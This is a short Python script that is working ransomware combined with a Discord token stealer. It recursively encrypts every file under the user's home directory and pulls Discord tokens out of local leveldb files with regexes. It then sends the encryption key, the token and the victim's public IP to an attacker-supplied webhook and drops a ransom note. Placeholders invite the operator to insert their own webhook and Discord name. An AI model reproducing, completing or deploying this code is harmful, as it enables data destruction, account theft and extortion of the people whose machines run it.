import os
import subprocess
from cryptography.fernet import Fernet
import requests
import re
import random
import json
from pathlib import Path
import playsound

key = Fernet.generate_key()
user = str(os.environ["USERNAME"])

def find_tokens(path):

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    for token in tokens:
        return token

def crypt(filename):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def warn():
    name = "" #change to your discord name and tag
    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
    ip = requests.get('https://api.ipify.org').text
    url = "" # change to your webhook
    data = {}
    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
    data["username"] = ip
    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    f = open("oof.txt", "w")
    f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!\nP.S: We also have your token")
    f.close()
    subprocess.call(r"notepad oof.txt", shell=False)

def main():
    path2 = "C:\\Users" + "\\" + user
    my_path = Path(path2)
    for file in my_path.glob("**/*.*"):
        crypt(file)
    warn()
    
main()